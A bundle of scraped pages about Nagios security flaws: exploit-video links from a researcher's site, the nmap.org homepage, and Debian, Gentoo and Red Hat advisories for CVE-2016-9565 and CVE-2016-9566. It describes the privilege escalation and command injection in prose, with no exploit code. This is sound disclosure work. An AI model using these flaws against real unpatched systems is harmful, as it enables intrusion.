IDxkYXdpZEBsZWdhbGhhY2tlcnMuY29tPokBOAQTAQIAIgUCVcjBNgIbAwYLCQgH
AwIGFQgCCQoLBBYCAwECHgECF4AACgkQU/e+VX9sCuRSmAf+MXvieaQiPYNgjey0
lVmvEw/+6EJ4DFZ203mLdrDwKLPSe0GrzbYyma2AA8XcWDimuhvsJLJ4Rt8j7F9W
G8kyaCh0ms/NTlSI3aI5ctcaX79WtmOLwfTo+rtl0czj/3ZMXHHnH1ky0M390VQ8
ixsk5Y53wAeTSrvN8Rwyg0x1ZHanwBmgDtFPa1ubYmFDHx/Ke1H57EvVMlyi4Yz5
vs58rqr3UNKxwoANQ0X38BGHZ7K1zObZGOwJGkuGt+K3LvBOLn7fbS1P4i6u5oIw
vJRDyq6ZWrLivkc3pypUV09jjQ9vQIRSXwhfCPwRb/U45SgnO5zTq8Ospb9qsG2E
remeaLkBDQRVyME2AQgArg35L60GCpwFjMGZ4KhHedD+ioaW08E4S9pCuxsE2kzC
D/0RfzAlKeCgvrULGCTXU4kcy3ODAeNlByEtF1SE7FlSteS1X12S4Kyn8RXhYhjI
XNwYzTGTStwprYMaRSEcIqCIAHa/dcOZzsiibf+G1phwKs7FU31TSgZrbpEjNdYO
AzFpeV7BqHoo2lMQJCDEN2EIb5KEQvNxyzFjyjHcnuJ/4GQRYF0xBcVqjoiqoedF
8Uib8WM9yFF+W21auZ+yURPp6HdqT6Cv6Qx2djpC3uKfms6VOJKBDVSiQhx/GcKh
dPAobFVDfOdeWj88v3RZyR9wwRAlur5qRVIzD75iTQARAQABiQEfBBgBAgAJBQJV
yME2AhsMAAoJEFP3vlV/bArktOoH/2ID21GHxsDX/x6cutapMuveK/4pmZ/U2jWr
r+urzFYKV+muezkJCm2qy02pcJYud1DxRY5aCe2J5m1WYGROnCm5CyBb8NiQLBeK
uzk4cK1fYqk35475dE+vHdnFdz1Td2laSafYze+M2KPX82YN4R/dGsOn8hR+39b4
WXS7zzoHh+KSwvs2ab6E8Nd3p4s0jvOvQo/+L52q1+iWSnzahXRTc3u1RHIzTf+f
X6NszAhli121jVQxLeaSuxkXyuKZM5IcFfojY55GSjLUblA1A+I2qmkcheA6rs4E
hZ+4m5DgtVG5+fJpoDLLxtKYp4hSxhd59Z9mlTWMqptK0WGkW48=
=vtjs
-----END [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----
```

# ExploitBox

1. [![](exploitbox_logo.png)
   **ExploitBox.io** - A Playground & Labs For Bug Hunters, Researchers, Penetration Testers &
   others interested in hacking, security, exploits and the art of exploitation.](https://ExploitBox.io)

# PoC Videos

1. [SquirrelMail < 1.4.23 Remote Code Execution (CVE-2017-7692)](https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
2. [PHPMailer / SwiftMailer / Zend-mail - Remote Code Execution
   (CVE-2016-10033 / CVE-2016-10045 / CVE-2016-10074 / CVE-2016-10034)](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)
3. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
4. [Nagios Core < 4.2.2 Curl Command Injection / Remote Code Execution (CVE-2016-9565)](https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
5. [MySQL / MariaDB / Percona - Race Cond. & Root Privilege Esc. (CVE-2016-6663 & CVE-2016-6664)](https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html)
6. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
7. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](http://legalhackers.com/videos/Apache-Tomcat-DebPkg-Root-PrivEsc-Exploit.html)
8. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection Exploit (CVE-2016-4264)](http://legalhackers.com/videos/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)

# Security Papers

1. [Pwning PHP mail() function For Fun And Remote Code Execution - New Exploitation Techniques And Vectors](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html)

[Follow @dawid\_golunski](https://twitter.com/%40dawid_golunski)

Legal Hackers © 2024



=== Content from nmap.org_9ba698e9_20250126_033720.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.debian.org_a3c7a84f_20250124_212419.html ===


---

[[Date Prev](msg00013.html)][[Date Next](msg00015.html)]
[[Thread Prev](msg00013.html)][[Thread Next](msg00015.html)]
[[Date Index](maillist.html#00014)]
[[Thread Index](threads.html#00014)]

# [SECURITY] [DLA 1615-1] nagios3 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1615-1] nagios3 security update
* *From*: Markus Koschany <apo@debian.org>
* *Date*: Mon, 24 Dec 2018 19:11:01 +0100
* *Message-id*: <[[🔎]](/msgid-search/fe156cb8-cffa-756a-24b5-94f6c99c76c2%40debian.org) [fe156cb8-cffa-756a-24b5-94f6c99c76c2@debian.org](msg00014.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Package        : nagios3
Version        : 3.5.1.dfsg-2+deb8u1
CVE ID         : CVE-2013-7108 CVE-2013-7205 CVE-2014-1878
                 CVE-2016-9566 CVE-2018-18245
Debian Bug     : 771466 823721 917138

Several issues were corrected in nagios3, a monitoring and management
system for hosts, services and networks.

CVE-2018-18245

      Maximilian Boehner of usd AG found a cross-site scripting (XSS)
      vulnerability in Nagios Core. This vulnerability allows attackers
      to place malicious JavaScript code into the web frontend through
      manipulation of plugin output. In order to do this the attacker
      needs to be able to manipulate the output returned by nagios
      checks, e.g. by replacing a plugin on one of the monitored
      endpoints. Execution of the payload then requires that an
      authenticated user creates an alert summary report which contains
      the corresponding output.

CVE-2016-9566

      It was discovered that local users with access to an account in
      the nagios group are able to gain root privileges via a symlink
      attack on the debug log file.

CVE-2014-1878

      An issue was corrected that allowed remote attackers to cause a
      stack-based buffer overflow and subsequently a denial of service
      (segmentation fault) via a long message to cmd.cgi.

CVE-2013-7205 | CVE-2013-7108

      A flaw was corrected in Nagios that could be exploited to cause a
      denial-of-service. This vulnerability is induced due to an
      off-by-one error within the process_cgivars() function, which can
      be exploited to cause an out-of-bounds read by sending a
      specially-crafted key value to the Nagios web UI.

For Debian 8 "Jessie", these problems have been fixed in version
3.5.1.dfsg-2+deb8u1.

We recommend that you upgrade your nagios3 packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEErPPQiO8y7e9qGoNf2a0UuVE7UeQFAlwhITVfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldEFD
RjNEMDg4RUYzMkVERUY2QTFBODM1RkQ5QUQxNEI5NTEzQjUxRTQACgkQ2a0UuVE7
UeTvxQ/7B0Q/4wBzssdM6SqFW7uSHb0RD8ptqCMqLmc1pM+1r0FDZNGysoKpSg0I
bQ7kMQU26rGGgZP0g3jinp4GoPRvVtSvsoUndz/8eUwG6ttJtBWhl83eKmWqRO0H
Ouxp76sCy/irC0z+1UpeNVU5vNS6AJIL/5hVsC/AxMDoRJy5rZBVd7zFJjeDITfQ
ayqxytWWg2Z7nuOnb2OIHBUZLgHpMky9DrxZoAbGm6L942BrldFK3xR1DFCfs206
r5u4Sd/7rDnUkRV2YnV619B5EBAeM23NW9I9cJK9V4o2rQ6oAcw8frB3NfUq0PuL
n7gtSKj9IFA2Jyxm947+5i4IJ9EHUUsEZjUOG3DJWLGJkcuq4iqjl1cX7VC4wPsK
F+hL5AgtZSEveDfElacUSUMAz2y00gp4QY0iSPUTdIxQ0Xjq/FTLMiFtW1y8A7sD
+x6phua5pErfg1fjslr5TaZ/CnXQFpVEhoDyQzsOW64oNGJcrAo+B376AOnoftOi
XnKPzsqRF5u2zIC0aM77wy7NwoGN+2QDcn/c1aSTK7S4NMUCm6e9GG30EhoWausR
jLv9rTi09l/eSlwSOwZJD+MgtidNuCuGeT0speYdSE1ajAh1lje/+g/UIPNA2RKT
2BjE3/YHl8ofoiPNZayKC3qiYWhLPyj04t+Tg6D9USGVlDZyfO0=
=xGlK
-----END PGP SIGNATURE-----

```

---



=== Content from security.gentoo.org_55645ff8_20250124_212420.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Nagios: Multiple vulnerabilities — GLSA **201702-26**

Multiple vulnerabilities have been found in Nagios, the worst of
which could lead to privilege escalation.

### Affected packages

| Package | **net-analyzer/nagios-core** on all architectures |
| --- | --- |
| Affected versions | < **4.2.4** |
| Unaffected versions | >= **4.2.4** |

### Background

Nagios is an open source host, service and network monitoring program.

### Description

Multiple vulnerabilities have been discovered in Nagios. Please review
the CVE identifiers referenced below for details.

### Impact

A local attacker, who either is already Nagios’s system user or
belongs to Nagios’s group, could potentially escalate privileges.

In addition, a remote attacker could read or write to arbitrary files by
spoofing a crafted response from the Nagios RSS feed server.

### Workaround

There is no known workaround at this time.

### Resolution

All Nagios users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-analyzer/nagios-core-4.2.4"

```
### References

* [CVE-2008-4796](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-4796)
* [CVE-2008-7313](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-7313)
* [CVE-2016-8641](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-8641)
* [CVE-2016-9565](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-9565)
* [CVE-2016-9566](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-9566)

**Release date**

February 21, 2017

**Latest revision**

February 21, 2017: 1

**Severity**

high

**Exploitable**

local, remote

**Bugzilla entries**

* [595194](https://bugs.gentoo.org/show_bug.cgi?id=595194)
* [598104](https://bugs.gentoo.org/show_bug.cgi?id=598104)
* [600864](https://bugs.gentoo.org/show_bug.cgi?id=600864)
* [602216](https://bugs.gentoo.org/show_bug.cgi?id=602216)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from bugzilla.redhat.com_3d00a860_20250126_033723.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1405363)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1405363)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1405363)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1405363

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1405363**](show_bug.cgi?id=1405363)
(CVE-2016-9565)
- [CVE-2016-9565](https://access.redhat.com/security/cve/CVE-2016-9565) nagios: Command injection via curl in MagpieRSS

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-9565 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1405364](show_bug.cgi?id=1405364 "CLOSED ERRATA - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS [fedora-all]") [1405365](show_bug.cgi?id=1405365 "CLOSED ERRATA - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS [epel-all]") [1406780](show_bug.cgi?id=1406780) [1413480](show_bug.cgi?id=1413480) [1413481](show_bug.cgi?id=1413481) [1413482](show_bug.cgi?id=1413482) [1413483](show_bug.cgi?id=1413483) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1405372](show_bug.cgi?id=1405372) [1415899](show_bug.cgi?id=1415899) | | TreeView+ | [depends on](buglist.cgi?bug_id=1405363&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1405363&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-12-16 10:14 UTC by Adam Mariš | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 02:51 UTC ([History](show_activity.cgi?id=1405363)) | | [CC List:](page.cgi?id=fields.html#cclist) | 36 users (show)  affix apevec avibelli chrisw cvsbot-xmlrpc gsterlin jbalunas jose.p.oliveira.oss jschluet jshepherd kbasil lemenkov lhh lpeer markmc mmagr ondrejj rbryant rcyriac redhat rhs-bugs rrajasek sclewis sgirijan shawn.starr sisharma smooge smooge srevivo ssaha s storage-qa-internal swilkerson tdecacqu tkirby vbellur | | Fixed In Version: | nagios 4.2.2 | | | Doc Type: | Bug Fix | | | Doc Text: | It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-08 03:04:32 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2017:0211](https://access.redhat.com/errata/RHSA-2017%3A0211) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:53:01 UTC | | Red Hat Product Errata | [RHSA-2017:0212](https://access.redhat.com/errata/RHSA-2017%3A0212) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:41 UTC | | Red Hat Product Errata | [RHSA-2017:0213](https://access.redhat.com/errata/RHSA-2017%3A0213) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:24 UTC | | Red Hat Product Errata | [RHSA-2017:0214](https://access.redhat.com/errata/RHSA-2017%3A0214) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:08 UTC | | Red Hat Product Errata | [RHSA-2017:0258](https://access.redhat.com/errata/RHSA-2017%3A0258) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-02-07 16:16:36 UTC | | Red Hat Product Errata | [RHSA-2017:0259](https://access.redhat.com/errata/RHSA-2017%3A0259) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-02-07 16:16:26 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

